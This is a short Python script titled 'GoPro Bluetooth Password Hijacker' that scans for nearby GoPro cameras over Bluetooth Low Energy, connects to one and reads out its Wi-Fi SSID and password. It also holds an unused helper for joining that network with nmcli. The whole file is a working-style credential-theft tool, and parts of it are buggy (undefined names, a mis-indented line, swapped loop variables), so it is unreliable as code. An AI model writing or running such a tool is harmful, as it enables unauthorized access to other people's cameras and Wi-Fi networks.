#!/usr/bin/env python3
from bluetooth.ble import DiscoveryService
import gatt
import time
import urllib.request
import subprocess
import signal

def shutdown(signum, frame):
    global run
    logging.info('shutting down {}...'.format(PROGRAM_NAME))
run = False

signal.signal(signal.SIGINT, shutdown)
signal.signal(signal.SIGTERM, shutdown)

print("GoPro Bluetooth Password Hijacker 1.0")
print("Put GoPro in Pairing mode!")
global wifissid
global wifipass
def connect(ssid, password):
	connection = subprocess.run(['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password], stdout=subprocess.PIPE)
	print(connection.stdout.decode('utf-8'))
	
def discover_camera():
    cameras=[]
    service = DiscoveryService()
    devices = service.discover(2)
    for address, name in devices.items():
        if name.startswith("GoPro"):
            cameras.append([name,address])
            print(cameras)
    if len(cameras) == 0:
        print("No cameras detected.")
        exit()
    if len(cameras) == 1:
        return cameras[0][1]
    for i, index in enumerate(cameras):
        print("[{}] {} - {}".format(index, i[0], i[1]))
    return cameras[input("ENTER BT GoPro ADDR: ")][1]

mac=discover_camera()
#print(mac)
manager = gatt.DeviceManager(adapter_name='hci0')

class AnyDevice(gatt.Device):

    def connect_succeeded(self):
        try:
            super().connect_succeeded()
            print("[%s] Connected" % (self.mac_address))
        except KeyboardInterrupt:
            print("press control-c to quit")
            exit()
    
#    def connect_succeeded(self):
 #       super().connect_succeeded()
  #      print("[%s] Connected" % (self.mac_address))
    
    def connect_failed(self, error):
        super().connect_failed(error)
        print("[%s] Connection failed: %s" % (self.mac_address, str(error)))

    def services_resolved(self):
        super().services_resolved() 
        wifipass = ""
        wifissid = ""    
        wifi_info_service = next(
            s for s in self.services
            if s.uuid == "b5f90001-aa8d-11e3-9046-0002a5d5c51b")

        for i in wifi_info_service.characteristics:
            print(i.uuid)
            if i.uuid == "b5f90002-aa8d-11e3-9046-0002a5d5c51b":
                print(i.read_value())
            if i.uuid == "b5f90003-aa8d-11e3-9046-0002a5d5c51b":
            	print(i.read_value())
            
        pass
        
    def characteristic_value_updated(self, characteristic, value):
        print("[recv] {}".format(characteristic.uuid))
        #global wifissid
        #global wifipass
        if characteristic.uuid == "b5f90002-aa8d-11e3-9046-0002a5d5c51b":
            print("\n\nThe Default WiFi SSID:", value.decode("utf-8"))
            #wifissid = value.decode("utf-8")
        if characteristic.uuid == "b5f90003-aa8d-11e3-9046-0002a5d5c51b":
        	print("\nThe Default Password:", value.decode("utf-8"))
        	#wifipass = value.decode("utf-8")
    	
#device = AnyDevice(mac_address=mac, manager=manager)
#device.connect()
#manager.run()
while True:
    try:
        print("Connecting")
        device = AnyDevice(mac_address=mac, manager=manager)
        device.connect()
        manager.run()
    except KeyboardInterrupt:
        print("press control-c again to quit")
        exit()
exit()